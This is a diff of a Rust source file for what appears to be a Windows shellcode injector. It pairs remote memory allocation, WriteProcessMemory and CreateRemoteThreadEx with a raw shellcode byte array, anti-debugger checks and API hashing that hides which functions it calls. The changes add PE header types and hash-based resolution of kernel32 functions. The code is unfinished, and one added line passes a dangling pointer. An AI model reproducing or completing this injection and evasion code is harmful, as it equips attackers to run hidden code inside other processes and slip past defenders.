@@ -1,16 +1,19 @@
 #![allow(unused_imports)]
 #![allow(non_snake_case)]
 #![allow(unused_variables)]
+
 use windows::{
     Win32::{
         System::{
             Memory::{VirtualAllocEx, VirtualProtectEx, VirtualFree, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
-            Diagnostics::Debug::{WriteProcessMemory, IsDebuggerPresent, CheckRemoteDebuggerPresent}, 
+            Diagnostics::Debug::{WriteProcessMemory, IsDebuggerPresent, CheckRemoteDebuggerPresent, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64}, 
             Threading::{CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS, INFINITE},
             LibraryLoader::LoadLibraryA,
+            SystemServices::IMAGE_DOS_HEADER,
         },
-        Foundation::{CloseHandle, BOOL},
+        Foundation::{CloseHandle, BOOL, HMODULE},
     },
+    core::{PCSTR, Result},
 };
 use std::{ptr::{self, null_mut, null}, process, mem};
 
@@ -29,6 +32,13 @@ fn getHashFromFunc(funcName: &str) -> u32 {
 fn getFuncAddressByHash(lib: &str, hash: u32){
     let functionAddress: *mut u16 = 0 as *mut u16;
 
+    let lib_ptr: PCSTR = unsafe {mem::transmute(format!("{}\0", lib).as_ptr())};
+
+    let libBase: Result<HMODULE> = unsafe {LoadLibraryA(lib_ptr)};
+    match libBase {
+        Ok(h) => println!("[+] Module injected! Handle: {:?}", h),
+        Err(e) => process::exit(-1),
+    }
 }
 
 
@@ -48,6 +58,7 @@ fn main() {
         0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x28, 0xff, 0xd0,
     ];
 
+    getFuncAddressByHash("kernel32", 0x00544e304);
 
     getHashFromFunc("Test");
 
